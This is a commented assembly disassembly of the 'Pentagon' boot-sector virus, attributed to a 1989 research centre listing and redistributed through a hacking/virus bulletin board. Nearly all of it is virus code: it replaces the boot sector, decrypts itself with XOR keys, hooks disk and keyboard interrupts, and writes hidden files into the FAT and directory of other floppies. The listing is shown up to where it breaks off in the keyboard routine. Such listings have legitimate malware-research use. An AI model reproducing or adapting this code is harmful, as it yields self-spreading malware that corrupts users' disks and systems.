;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
	page	65,132
	title	The 'Pentagon' Virus
; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ                 British Computer Virus Research Centre                   บ
; บ  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    บ
; บ  Telephone:     Domestic   0273-26105,   International  +44-273-26105    บ
; บ                                                                          บ
; บ                          The 'Pentagon' Virus                            บ
; บ                Disassembled by Joe Hirst,      March 1989                บ
; บ                                                                          บ
; บ                      Copyright (c) Joe Hirst 1989.                       บ
; บ                                                                          บ
; บ      This listing is only to be made available to virus researchers      บ
; บ                or software writers on a need-to-know basis.              บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

	; The disassembly has been tested by re-assembly using MASM 5.0.

	; The code section between offsets 59H and C4H (which is normally
	; encrypted) appears to have been separately assemblied using A86.

	; Virus is possibly an honorary term, at least for this sample,
	; as all attempts to run it have so far failed.

	; This virus consists of a boot sector and two files.
	; The boot sector is a normal PCDOS 3.20 boot sector with three
	; changes:

	; 1.	The OEM name 'IBM' has been changed to 'HAL'.

	; 2.	The first part of the virus code overwrites 036H to 0C5H.

	; 3.	100H-122H has been overwritten by a character string.

	; The name of the first file is the hex character 0F9H.  This file
	; contains the rest of the virus code followed by the original boot
	; sector.

	; The name of the second file is PENTAGON.TXT.  This file does not
	; appear to be used in any way or contain any meaningful data.

	; Both files are created without the aid of DOS, and the first
	; file is accessed by its stored absolute location.

	; Four different sections of the virus are separately encrypted:

	; 1.	004AH - 004BH, key 0ABCDH - load decryption key

	; 2.	0059H - 00C4H, key 0FCH - rest of virus code in boot sector.

	; 3.	0791H - 07DFH, key 0AAH - the file name and copyright message.

	; 4.	0800H - 09FFH, key 0FCH - the original boot sector.

SEG70	SEGMENT AT 70H
	ASSUME	CS:SEG70
EXIT:
SEG70	ENDS

BOOT	SEGMENT AT 0

	ORG	413H
BW0413	DW	?

	ORG	417H
BB0417	DB	?

	ORG	51CH
BW051C	DW	?

	ORG	7C0BH
DW7C0B	DW	?

	ORG	7C18H
DW7C18	DW	?
DW7C1A	DW	?

	ORG	7C2AH
DB7C2A	DB	?

	ORG	7C37H
DW7C37	DW	?
DW7C39	DW	?
DB7C3B	DB	?
DB7C3C	DB	?
DW7C3D	DW	?

	ORG	7DB7H
DB7DB7	DB	?

	ORG	7DFDH
DB7DFD	DB	?

	ORG	7E00H
DW7E00	DW	?		; DW008F - Track and sector of rest of code
DW7E02	DW	?		; DW0091 - Head and drive of rest of code
DW7E04	DW	?		; DW0093 - Segment address of virus

BOOT	ENDS

CODE	SEGMENT BYTE PUBLIC 'CODE'
	ASSUME CS:CODE,DS:CODE

	IF1
	ORG	206H
BP0095X	LABEL	NEAR
	ENDIF

	ORG	0
START:	JMP	BP0036

	DB	'HAL  3.2'

	DW	512		; BPB001 - Bytes per sector
	DB	2		; BPB002 - Sectors per allocation unit
	DW	1		; BPB003 - Reserved sectors
	DB	2		; BPB004 - Number of FATs
	DW	112		; BPB005 - Number of root dir entries
	DW	720		; BPB006 - Number of sectors
	DB	0FDH		; BPB007 - Media Descriptor
	DW	2		; BPB008 - Number of sectors per FAT
	DW	9		; BPB009 - Sectors per track
	DW	2		; BPB010 - Number of heads
	DW	0		; BPB011 - Number of hidden sectors (low order)
BPB012	DW	0			; Number of hidden sectors (high order)

	DB	10 DUP (0)

HEADNO	DB	0

	; Interrupt 30 (1EH) - Disk parameter table

DSKTAB	DB	4 DUP (0), 0FH, 4 DUP (0)

	DB	1, 0

BP0036:	CLI
	MOV	AX,CS			; \ Set SS to CS
	MOV	SS,AX			; /
	MOV	SP,0F000H		; Set stack pointer
	MOV	DS,AX			; Set DS to CS
	STI
	MOV	BP,OFFSET BP0044+7C00H
BP0044:	XOR	WORD PTR [BP+6],0ABCDH	; Decrypt key instruction
	NOP
DW004A	EQU	THIS WORD
	MOV	DH,0FCH			; Decryption key
	MOV	BP,OFFSET BP0059+7C00H	; Decryption start address
	MOV	CX,OFFSET DB00C5-BP0059	; Length to decrypt
BP0052:	XOR	[BP+00],DH		; Decrypt a byte
	INC	BP			; Next byte
	LOOP	BP0052			; Repeat for all of it
	NOP
BP0059:	XOR	DW004A+7C00H,0ABCDH	; Re-encrypt key instruction
	MOV	AX,BW0413		; Get RAM size in K
	SUB	AX,0005			; Subtract five K
	MOV	BW0413,AX		; Replace amended RAM size
	MOV	CL,06			; Bits to move
	SHL	AX,CL			; Convert to segment address
	MOV	DW0093+7C00H,AX		; Save segment address
	NOP
	MOV	ES,AX			; Set ES to this segment
	XOR	DI,DI			; Move to start
	MOV	SI,7C00H		; From start of boot sector buffer
	MOV	CX,0200H		; Move one sector
	CLD
	REPZ	MOVSB			; Move sector to high-core
	NOP

	; Move next section of code to a safe area

	MOV	DI,200H+7C00H
	MOV	SI,OFFSET DW008F+7C00H
	MOV	CX,OFFSET DB00C5-DW008F	; Length to move
	PUSH	DS			; \ Set ES to DS
	POP	ES			; /
	CLD
	REPZ	MOVSB			; Copy program section
	JMP	BP0095X			; This is BP0095 in new location

DW008F	DW	0B02H			; Track and sector of rest of code
DW0091	DW	100H			; Head and drive of rest of code
DW0093	DW	9EC0H			; Segment address of virus

BP0095:	MOV	CX,0004			; Number of retries
BP0098:	PUSH	CX
	MOV	CX,DW7E00		; Get track and sector number
	MOV	DX,DW7E02		; Get head and drive number
	MOV	ES,DW7E04		; Get buffer segment address
	MOV	BX,0200H		; Buffer offset
	MOV	AX,0201H		; Read one sector
	INT	13H			; Disk I/O
	JNB	BP00B8			; Branch if no error
	POP	CX
	XOR	AH,AH			; Reset floppy disk sub-system
	INT	13H			; Disk I/O
	LOOP	BP0098			; Retry
	INT	18H			; Drop into basic

BP00B8:	POP	CX
	MOV	AX,OFFSET DW7E04		; Address segment address
	CLI
	MOV	SP,AX			; Point SP at segment address
	STI
	MOV	AX,0200H		; \ Address of second section
	PUSH	AX			; /
	RETF

DB00C5	DB	50H

	; The rest of this sector is a normal PCDOS 3.20 boot sector
	; which has been overwritten at 100H-122H by a character string

	DB	61H, 0

	XOR	AH,AH
	INT	16H
	POP	SI
	POP	DS
	POP	[SI]

DW00D0	DW	0B06H			; Track and sector numbers
DW00D2	DW	0100H			; Head and drive numbers
	DB	19H

	MOV	SI,OFFSET DB7DB7
	JMP	NEAR PTR DB00C5

	MOV	AX,BW051C
	XOR	DX,DX
	DIV	DW7C0B
	INC	AL
	MOV	DB7C3C,AL
	MOV	AX,DW7C37
	MOV	DW7C3D,AX
	MOV	BX,0700H
	MOV	AX,DW7C37
	CALL	BP0137
	MOV	AX,DW7C18
	SUB	AL,DB7C3B
	INC	AX
	PUSH	AX

	DB	'(c) 1987 The Pentagon, Zorell Group'

	DB	7CH
	JMP	FAR PTR EXIT

BP0129:	LODSB
	OR	AL,AL
	JZ	BP0150
	MOV	AH,0EH
	MOV	BX,7
	INT	10H
	JMP	BP0129

BP0137:	XOR	DX,DX
	DIV	DW7C18
	INC	DL
	MOV	DB7C3B,DL
	XOR	DX,DX
	DIV	DW7C1A
	MOV	DB7C2A,DL
	MOV	DW7C39,AX
BP0150:	RET

	MOV	AH,2
	MOV	DX,DW7C39
	MOV	CL,6
	SHL	DH,CL
	OR	DH,DB7C3B
	MOV	CX,DX
	XCHG	CH,CL
	MOV	DL,DB7DFD
	MOV	DH,DB7C2A
	INT	13H
	RET

	DB	0DH, 0AH, 'Non-System disk or disk error', 0DH, 0AH
	DB	'Replace and strike any key when ready', 0DH, 0AH, 0
	DB	0DH, 0AH, 'Disk Boot failure', 0DH, 0AH, 0
	DB	'IBMBIO  COMIBMDOS  COM'

	ORG	01FEH
	DW	0AA55H

	; Second sector of virus

BP0200:	CLI
	MOV	SP,0F000H		; Reset stack pointer
	STI
	XOR	AX,AX			; \ Address zero
	MOV	DS,AX			; /
	MOV	BX,004CH		; INT 13H jump address
	MOV	BP,01A0H		; INT 68H jump address
	CMP	WORD PTR DS:[BP+0],0	; Is INT 68H in use
	JE	BP0219			; Branch if not
	JMP	BP024E

BP0219:	MOV	AX,[BX]			; Get INT 13H offset
	MOV	DS:[BP+0],AX		; Set INT 68H to this offset
	MOV	AX,[BX+2]		; Get INT 13H segment
	MOV	DS:[BP+2],AX		; Set INT 68H to this segment
	MOV	WORD PTR [BX],OFFSET BP04C4	; Set address of INT 13H routine
	MOV	AX,CS			; \ Set INT 13H segment
	MOV	[BX+2],AX		; /
	MOV	BX,0024H		; INT 9 jump address
	MOV	BP,01A4H		; INT 69H jump address
	MOV	AX,[BX]			; Get INT 9 offset
	MOV	DS:[BP],AX		; Set INT 69H to this offset
	MOV	AX,[BX+2]		; Get INT 9 segment
	MOV	DS:[BP+2],AX		; Set INT 69H to this segment
	MOV	WORD PTR [BX],OFFSET BP0709	; Set address of INT 9 routine
	MOV	AX,CS			; \ Set INT 9 segment
	MOV	[BX+02],AX		; /
	JMP	BP0254

BP024E:	MOV	BX,OFFSET BW0413	; Address size of RAM
	ADD	WORD PTR [BX],5		; Restore the 5K
BP0254:	MOV	BP,OFFSET DW008F	; Address virus pointer
	MOV	CX,CS:[BP]		; Get track and sector
	MOV	DX,CS:[BP+2]		; Get head and device
	MOV	BX,0200H		; Address second sector
	MOV	CX,3			; Three sectors to read
BP0265:	PUSH	CX			; Save read count
	MOV	AX,0201H		; Read one sector
	MOV	CX,CS:[BP]		; Get track and sector
	CALL	BP0300			; Address to next sector
	MOV	CS:[BP],CX		; Save new track and sector
	ADD	BX,0200H		; Address next buffer area
	CALL	BP031B			; Read from disk
	JNB	BP0280			; Branch if no error
	POP	CX
	INT	18H			; Drop into basic

	; Read file, first sector

BP0280:	POP	CX			; Retrieve read count
	LOOP	BP0265			; Repeat for other sectors
	MOV	BP,OFFSET DW00D0	; Address file pointers
	MOV	CX,CS:[BP]		; Get track and sector
	MOV	DX,CS:[BP+2]		; Get head and drive
	MOV	BX,1000H		; Buffer address
	MOV	AX,0201H		; Read one sector
	CALL	BP031B			; Read from disk
	JNB	BP029B			; Branch if no error
	INT	18H			; Drop into basic

	; Read file, second sector

BP029B:	CALL	BP0300			; Address to next sector
	ADD	BX,0200H		; Update buffer address
	MOV	AX,0201H		; Read one sector
	CALL	BP031B			; Read from disk
	JNB	BP02AC			; Branch if no error
	INT	18H			; Drop into basic

BP02AC:	LEA	CX,DB07E0		; Address end of encrypted
	LEA	BX,DB0791		; Address start of encrypted
	SUB	CX,BX			; Length to decrypt
	MOV	AL,0AAH			; Load encryption key
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	CALL	BP0315			; Decrypt
	MOV	AX,CS			; \
	MOV	ES,AX			;  ) Set ES & DS to CS
	MOV	DS,AX			; /
	MOV	DI,0100H		; Middle of 1st sector
	MOV	SI,OFFSET DB07BC	; Address copyright message
	MOV	CX,0023H		; Length of copyright message
	REPZ	MOVSB			; Copy copyright message
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	MOV	CX,0200H		; Length to decrypt
	MOV	BX,0800H		; Address boot sector store
	MOV	AL,0FCH			; Load encryption key
	CALL	BP0315			; Decrypt
	XOR	AX,AX			; \ Segment zero
	MOV	ES,AX			; /
	MOV	DI,7C00H		; Boot sector buffer
	MOV	SI,0800H		; Address boot sector store
	MOV	CX,0200H		; Sector length
	CLD
	REPZ	MOVSB			; Copy boot sector
	DB	0EAH			; Far jump to boot sector
	DW	7C00H, 0

	DB	16 DUP (0)

	; Address to next sector

BP0300:	INC	CL			; Increment sector number
	CMP	CL,0AH			; Is it sector ten?
	JL	BP0314			; Branch if not
	MOV	CL,1			; Set sector to one
	INC	DH			; Increment head
	CMP	DH,2			; Is it head two?
	JL	BP0314			; Branch if not
	XOR	DH,DH			; Set head to zero
	INC	CH			; Increment track
BP0314:	RET

	; Encrypt/decrypt

BP0315:	XOR	[BX],AL			; Encrypt a byte
	INC	BX			; Address next byte
	LOOP	BP0315			; Repeat for count
	RET

	; Read from or write to disk

BP031B:	PUSH	SI
	PUSH	DI
	MOV	SI,AX			; Save function
	MOV	DI,CX			; Save track and sector
	MOV	CX,3			; Number of retries
BP0324:	PUSH	CX
	MOV	AX,SI			; Retrieve function
	MOV	CX,DI			; Retrieve track and sector
	INT	68H			; Disk I/O
	JNB	BP0338			; Branch if no error
	XOR	AH,AH			; Reset sub-system
	INT	68H			; Disk I/O
	POP	CX			; Retrieve number of retries
	LOOP	BP0324			; Retry
	STC
	JMP	BP033B

BP0338:	POP	CX			; Retrieve number of retries
	MOV	CX,DI			; Retrieve track and sector
BP033B:	POP	DI
	POP	SI
	RET

	; Find unused FAT entry pair

BP033E:	PUSH	AX
	PUSH	DX
	PUSH	ES
	PUSH	DI
	PUSH	CS
	POP	ES
	MOV	DX,CX			; Initial cluster number
	XOR	AL,AL			; Search for zero
BP0348:	MOV	CX,3			; Three bytes to check
	MOV	DI,BX			; Address FAT entry pair
	REPZ	SCASB			; Scan for non-zero
	CMP	CX,0			; Is FAT pair unused
	JE	BP0361			; Branch if yes
	ADD	BX,3			; Address next entry pair
	ADD	DX,2			; Update entry count
	CMP	DX,0162H		; Entry 354?
	JLE	BP0348			; Process entry pair if not
	STC
BP0361:	MOV	CX,DX			; Cluster number found
	POP	DI
	POP	ES
	POP	DX
	POP	AX
	RET

	; Find and flag an unused entry

BP0368:	TEST	WORD PTR [BX],0FFFH	; Test first FAT entry
	JZ	BP0384			; Branch if unused
	INC	CX			; Next entry number
	INC	BX			; Address 2nd entry
	TEST	WORD PTR [BX],0FFF0H	; Test second FAT entry
	JZ	BP038B			; Branch if unused
	INC	CX			; Next entry number
	ADD	BX,2			; Address next entry pair
	CMP	CX,0163H		; Entry 355?
	JLE	BP0368			; Process next FAT pair if not
	STC
	JMP	BP0390

BP0384:	OR	WORD PTR [BX],0FFFH	; Flag 1st FAT entry EOF
	JMP	BP038F

BP038B:	OR	WORD PTR [BX],0FFF0H	; Flag 2nd FAT entry EOF
	nop				; ** length adjustment, MASM 5.0
BP038F:	CLC
BP0390:	RET

	; Unflag Brain virus bad clusters

BP0391:	PUSH	AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	MOV	DX,CX
BP0397:	MOV	AX,[BX]			; Get FAT entry
	AND	AX,0FFFH		; Isolate FAT entry
	CMP	AX,0FF7H		; Bad cluster?
	JE	BP03B8			; Branch if yes
	INC	DX			; Add to cluster number
	INC	BX			; Address next entry
	MOV	AX,[BX]			; Get FAT entry
	MOV	CL,4			; Bits to move
	SHR	AX,CL			; Move FAT entry
	CMP	AX,0FF7H		; Bad Cluster?
	JE	BP03C8			; Branch if yes
	INC	DX			; Add to cluster number
	ADD	BX,2			; Address next pair of entries
	CMP	DX,015FH		; Entry 351?
	JLE	BP0397			; Process this pair if not
BP03B8:	MOV	WORD PTR [BX],0		; \
	MOV	BYTE PTR [BX+2],0	;  ) Clear three entries
	XOR	WORD PTR [BX+3],0FF7H	; /
	JMP	BP03D5

BP03C8:	XOR	WORD PTR [BX],0FF7H	; \
	MOV	WORD PTR [BX+2],0	;  ) Clear three entries
	MOV	BYTE PTR [BX+4],0	; /
BP03D5:	POP	DX
	POP	CX
	POP	BX
	POP	AX
	RET

	; Convert cluster number to track, head and sector

BP03DA:	PUSH	AX
	PUSH	BX
	SUB	CX,2			; Subtract number of 1st cluster
	ADD	CX,CX			; Two sectors per cluster
	ADD	CX,0CH			; Add sector num of 1st cluster
	MOV	AX,CX			; Copy sector number
	PUSH	AX			; Save sector number
	MOV	BL,9			; Nine sectors per track
	DIV	BL			; Divide by sectors per track
	INC	AH			; First sector is one
	MOV	CL,AH			; Move sector number
	XOR	AH,AH			; Clear top of register
	MOV	BL,2			; Two heads
	DIV	BL			; Divide by heads
	MOV	DH,AH			; Move head number
	POP	AX			; Retrieve sector number
	MOV	BL,12H			; 18 sectors per track (both sides)
	DIV	BL			; Divide by sectors per track
	MOV	CH,AL			; Move track number
	POP	BX
	POP	AX
	RET

	; Update directory

BP0401:	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	SI
	PUSH	DI
	MOV	CX,000FH		; Fifteen entries per sector
	XOR	DI,DI			; Start of sector
	CMP	AX,7			; Is this first dir sector
	JNE	BP0416			; Branch if not
	SUB	CX,3			; Subtract three from count
	ADD	DI,60H			; Address fourth entry
BP0416:	CMP	BYTE PTR CS:DB07E1,0FFH	; Is Brain switch on?
	JNE	BP0443			; Branch if not
	CMP	BYTE PTR ES:[BX+DI+0BH],8 ; Is it volume label?
	JNE	BP0443			; Branch if not
	MOV	BYTE PTR CS:DB07E2,0FFH	; Set directory update switch on
	PUSH	SI
	PUSH	DI
	PUSH	CX
	ADD	DI,BX			; Add sector address
	LEA	SI,DB07B1		; Address label
	MOV	CX,000BH		; Length of new label
	CLD
	REPZ	MOVSB			; Copy label
	MOV	BYTE PTR CS:DB07E1,0	; Set Brain switch off
	POP	CX
	POP	DI
	POP	SI
BP0443:	CMP	BYTE PTR ES:[BX+DI],0	; Is entry unused?
	JE	BP0452			; Branch if yes
	ADD	DI,20H			; Address next entry
	LOOP	BP0416			; Process next entry
	STC
	JMP	BP0487

BP0452:	ADD	DI,BX			; Add sector address
	MOV	BX,DI			; Move entry address
	MOV	BYTE PTR [BX],0F9H	; "Filename"
	MOV	BYTE PTR [BX+0BH],23H	; Read-only, hidden attributes
	MOV	CX,CS:DW0784		; Get virus cluster number
	MOV	[BX+1AH],CX		; Store starting cluster
	MOV	WORD PTR [BX+1CH],0800H	; \ File size 2048
	MOV	WORD PTR [BX+1EH],0	; /
	ADD	DI,20H			; Address next entry
	MOV	BX,DI			; Move entry address
	LEA	SI,DB0791		; Address start of encrypted
	MOV	CX,0020H		; One complete entry to move
	CLD
	REPZ	MOVSB			; Move entry
	MOV	CX,CS:DW0786		; Get file cluster number
	MOV	[BX+1AH],CX		; Store starting cluster
	CLC
BP0487:	POP	DI
	POP	SI
	POP	DX
	POP	CX
	POP	BX
	RET

	; Read actual boot sector - Brain infected

BP048D:	PUSH	AX
	PUSH	CX
	PUSH	DX
	MOV	CX,[BX+7]		; Get track and sector
	MOV	DH,[BX+6]		; Get head number
	MOV	AX,0201H		; Read one sector
	CALL	BP031B			; Read from disk
	POP	DX
	POP	CX
	POP	AX
	RET

	; Generate a sound

BP04A0:	MOV	BP,1			; One loop
	MOV	AL,0B6H			; Counter two, both bytes, sq wave
	OUT	43H,AL			; Set PIT control register
	MOV	AX,0533H		; Sound frequency
	OUT	42H,AL			; Send first byte
	MOV	AL,AH			; Get second byte
	OUT	42H,AL			; Send second byte
	IN	AL,61H			; Get port B
	MOV	AH,AL			; Save port B value
	OR	AL,3			; Set sound bits on
	OUT	61H,AL			; Send port B
	SUB	CX,CX			; Maximum loop count
BP04BA:	LOOP	BP04BA			; Delay
	DEC	BP			; Decrement count of loops
	JNZ	BP04BA			; Branch if not zero (it won't be)
	MOV	AL,AH			; Recover original port B
	OUT	61H,AL			; Send port B
	RET

	; Int 13H routine

BP04C4:	STI
	PUSH	AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	DS
	PUSH	SI
	PUSH	ES
	PUSH	DI
	MOV	CS:DB0790,DL		; Save device
	CMP	AH,2			; Is function a read?
	JE	BP04DA			; Branch if yes
	JMP	BP06FC			; Pass on to BIOS

BP04DA:	DEC	CS:DB07E0		; Decrement count
	JZ	BP04E4			; Infect when zero
	JMP	BP06FC			; Pass on to BIOS

	; Get boot sector

BP04E4:	MOV	BYTE PTR CS:DB07E0,10H	; Set count to 16
	PUSH	CS			; \
	POP	AX			;  \ Set DS & ES to CS
	MOV	DS,AX			;  /
	MOV	ES,AX			; /
	MOV	BX,0800H		; Address boot sector store
	MOV	CX,1			; Track zero, sector one
	MOV	DH,0			; Head zero
	MOV	DL,CS:DB0790		; Load device
	MOV	AX,0201H		; Read one sector
	CALL	BP031B			; Read from disk
	JNB	BP0508			; Branch if no error
	JMP	BP06FC			; Pass on to BIOS

	; Check for Brain virus

BP0508:	CMP	WORD PTR [BX+4],1234H	; Is it a Brain boot sector?
	JNE	BP051D			; Branch if not
	MOV	BYTE PTR CS:DB07E1,0FFH	; Set Brain switch on
	CALL	BP048D			; Read actual boot sector
	JNB	BP052D			; Branch if no error
	JMP	BP06FC			; Pass on to BIOS

	; Check for Pentagon virus

BP051D:	MOV	BYTE PTR CS:DB07E1,0	; Set Brain switch off
	CMP	WORD PTR [BX+4AH],577BH	; Is it infected by pentagon?
	JNE	BP052D			; Branch if not
	JMP	BP06FC			; Pass on to BIOS

	; Check for DOS boot sector

BP052D:	CMP	WORD PTR [BX+01FEH],0AA55H	; Is it a valid boot sector
	JE	BP0538			; Branch if yes
	JMP	BP06FC			; Pass on to BIOS

	; Get first FAT sector

BP0538:	ADD	BX,0200H		; Update buffer address
	INC	CL			; Next sector
	MOV	AX,0201H		; Read one sector
	CALL	BP031B			; Read from disk
	JNB	BP0549			; Branch if no error
	JMP	BP06FC			; Pass on to BIOS

	; Check media byte

BP0549:	CMP	BYTE PTR [BX],0FDH	; Is it 360K disk
	JE	BP0551			; Branch if yes
	JMP	BP06FC			; Pass on to BIOS

	; Get second sector of FAT

BP0551:	ADD	BX,0200H		; Update buffer address
	INC	CL			; Next sector
	MOV	AX,0201H		; Read one sector
	CALL	BP031B			; Read from disk
	JNB	BP0562			; Branch if no error
	JMP	BP06FC			; Pass on to BIOS

BP0562:	CMP	BYTE PTR CS:DB07E1,0FFH	; Test Brain switch
	JNE	BP0573			; Branch if off
	MOV	BX,0A03H		; Address first cluster in FAT
	MOV	CX,2			; First cluster is number two
	CALL	BP0391			; Unflag Brain virus bad clusters
BP0573:	MOV	BX,0A96H		; \ Start from cluster 100
	MOV	CX,0064H		; /
	CALL	BP033E			; Find unused FAT entry pair
	JNB	BP0581			; Branch if no error
	JMP	BP06FC			; Pass on to BIOS

BP0581:	MOV	CS:DW0784,CX		; Save virus cluster number
	INC	CX			; Next cluster number
	MOV	[BX],CX			; Put it in first FAT entry
	OR	WORD PTR [BX+01],0FFF0H	; Flag 2nd entry as EOF
	nop				; ** length adjustment, MASM 5.0
	DEC	CX			; Set cluster number back
	CALL	BP03DA			; Cluster num to trck/hd/sect
	MOV	CS:DW0788,CX		; Save virus track & sector
	MOV	CS:DW078A,DX		; Save virus head and drive
	PUSH	BP
	MOV	BP,OFFSET DW008F	; Address virus pointer
	MOV	CS:[BP+00],CX		; Save virus track & sector
	MOV	CS:[BP+03],DH		; Save virus head
	POP	BP
	MOV	BX,0A96H		; \ Start from cluster 100
	MOV	CX,0064H		; /
	CALL	BP0368			; Find an unused FAT entry
	JNB	BP05B7			; Branch if no error
	JMP	BP06FC			; Pass on to BIOS

BP05B7:	MOV	CS:DW0786,CX		; Save file cluster number
	CALL	BP03DA			; Cluster num to trck/hd/sect
	MOV	CS:DW078C,CX		; Save file track & sector
	MOV	CS:DW078E,DX		; Save file head and drive
	PUSH	BP
	MOV	BP,OFFSET DW00D0	; Address file pointers
	MOV	CS:[BP],CX		; Save track and sector
	MOV	CS:[BP+3],DH		; Save head
	POP	BP
	MOV	AL,0FCH			; Load encryption key
	MOV	BX,0800H		; Address boot sector store
	MOV	CX,0200H		; Length to encrypt
	CALL	BP0315			; Encrypt/decrypt
	MOV	BYTE PTR CS:DB07E0,20H	; Set count to 32
	LEA	CX,DB07E0		; Address end of encrypted
	LEA	BX,DB0791		; Address start of encrypted
	SUB	CX,BX			; Length to encrypt
	MOV	AL,0AAH			; Load encryption key
	CALL	BP0315			; Encrypt/decrypt
	MOV	BX,0200H		; Virus second sector
	MOV	AX,0301H		; Write one sector
	MOV	CX,CS:DW0788		; Get virus track & sector
	MOV	DX,CS:DW078A		; Get virus head and drive
	MOV	DL,CS:DB0790		; Load device
	CALL	BP031B			; Write to disk
	JNB	BP0613			; Branch if no error
	JMP	BP06FC			; Pass on to BIOS

BP0613:	MOV	AX,3			; Three sectors to write
BP0616:	PUSH	AX			; Save write count
	ADD	BX,0200H		; Next sector buffer
	MOV	AX,0301H		; Write one sector
	CALL	BP0300			; Address to next sector
	CALL	BP031B			; Write to disk
	JB	BP062D			; Branch if error
	POP	AX			; Retrieve write count
	DEC	AX			; Decrement count
	JNZ	BP0616			; Repeat for each sector
	JMP	BP0631

BP062D:	POP	AX
	JMP	BP06FC			; Pass on to BIOS

	; Write file

BP0631:	LEA	CX,DB07E0		; Address end of encrypted
	LEA	BX,DB0791		; Address start of encrypted
	SUB	CX,BX			; Length to encrypt
	MOV	AL,0AAH			; Load encryption key
	CALL	BP0315			; Encrypt/decrypt
	MOV	BYTE PTR CS:DB07E0,10H	; Set count to 16
	MOV	CX,CS:DW078C		; Get file track & sector
	MOV	DX,CS:DW078E		; Get file head and drive
	MOV	DL,CS:DB0790		; Load device
	MOV	BX,1000H		; Address file buffer
	MOV	AX,2			; Two sectors to write
BP065B:	PUSH	AX			; Save write count
	MOV	AX,0301H		; Write one sector
	CALL	BP031B			; Write to disk
	JB	BP062D			; Branch if error
	CALL	BP0300			; Address to next sector
	ADD	BX,0200H		; Address next sector buffer
	POP	AX			; Retrieve write count
	DEC	AX			; Decrement write count
	JNZ	BP065B			; Write each sector
	MOV	BX,OFFSET BP0059	; Start of encrypted
	MOV	CX,OFFSET DB00C5-BP0059	; Length to encrypt
	MOV	AL,0FCH			; Load encryption key
	CALL	BP0315			; Encrypt
	XOR	BX,BX			; Address start of virus
	MOV	AX,0301H		; Write one sector
	MOV	CX,1			; Track zero, sector 1
	XOR	DH,DH			; Head zero
	CALL	BP031B			; Write to disk
	JNB	BP068C			; Branch if no error
	JMP	BP06FC			; Pass on to BIOS

	; Write 1st FAT sector

BP068C:	MOV	BX,OFFSET BP0059
	MOV	CX,OFFSET DB00C5-BP0059	; Length to decrypt
	MOV	AL,0FCH			; Load encryption key
	CALL	BP0315			; Decrypt
	MOV	BX,0A00H		; Address 1st FAT sector
	MOV	AX,0301H		; Write one sector
	MOV	CX,2			; Track zero, sector 2
	CALL	BP031B			; Write to disk
	JNB	BP06A8			; Branch if no error
	JMP	BP06FC			; Pass on to BIOS

	; Write 2nd FAT sector

BP06A8:	ADD	BX,0200H		; Address 2nd FAT sector
	MOV	AX,0301H		; Write one sector
	INC	CX			; Next sector
	CALL	BP031B			; Write to disk
	JNB	BP06B8			; Branch if no error
	JMP	BP06FC			; Pass on to BIOS

	; Create directory entries

BP06B8:	MOV	BX,0E00H		; Address directory
	MOV	CX,5			; Track zero, sector 5
	XOR	DH,DH			; Head zero
	MOV	AX,7			; Seven sectors to read
BP06C3:	PUSH	AX			; Save read count
	MOV	AX,0201H		; Read one sector
	CALL	BP0300			; Address to next sector
	CALL	BP031B			; Read from disk
	JB	BP06F1			; Branch if error
	POP	AX			; \ Retrieve and save read count
	PUSH	AX			; /
	MOV	BYTE PTR CS:DB07E2,0	; Set directory update switch off
	CALL	BP0401			; Update directory
	JNB	BP06F5			; Branch if entry found
	CMP	BYTE PTR CS:DB07E2,0FFH	; Test directory update switch
	JNE	BP06EA			; Branch if off
	MOV	AX,0301H		; Write one sector
	CALL	BP031B			; Write to disk
BP06EA:	POP	AX			; Retrieve sector count
	DEC	AX			; Decrement sector count
	JNZ	BP06C3			; Repeat for each sector
	JMP	BP06FC			; Pass on to BIOS

BP06F1:	POP	AX
	JMP	BP06FC			; Pass on to BIOS

BP06F5:	POP	AX
	MOV	AX,0301H		; Write one sector
	CALL	BP031B			; Write to disk
BP06FC:	POP	DI
	POP	ES
	POP	SI
	POP	DS
	POP	DX
	POP	CX
	POP	BX
	POP	AX
	INT	68H			; Disk I/O
	RETF	2

		; Int 9 routine

BP0709:	PUSH	AX
	PUSH	BX
	PUSH	DS
	MOV	BYTE PTR CS:DB07E3,0	; Set off reboot switch
	XOR	AX,AX			; \ Address zero
	MOV	DS,AX			; /
	IN	AL,60H			; Get keyboard token
	MOV	BX,OFFSET BB0417	; Address Key states
	TEST	BYTE PTR [BX],8		; Alt key depressed?
	JZ	BP0736			; Branch if not
	TEST	BYTE PTR [BX],4		; Ctrl key depressed?
	JZ	BP0736			; Branch if not
	CMP	AL,53H			; Del character token?
	JNE	BP0736			; Branch if not
	XOR	BYTE PTR [BX],0CH	; Set off Alt & Ctrl states
	XOR	AL,AL			; \ ?
	OUT	60H,AL			; /
	MOV	BYTE PTR CS:DB07E3,0FFH	; Set on reboot switch
BP0736:	POP	DS
	POP	BX
	POP	AX
	INT	69H			; Keyboard I/O
	PUSHF
	CMP	BYTE PTR CS:DB07E3,0FFH	; Test reboot switch
	JNE	BP0765			; Branch if off
	POPF
	MOV	AX,3			; Set mode three
	INT	10H			; VDU I/O
	CLI
	MOV	AL,0AH			; Repeat delay 10 times
	XOR	CX,CX			; Maximum loop
BP074F:	LOOP	BP074F			; Delay
	DEC	AL			; Decrement delay count
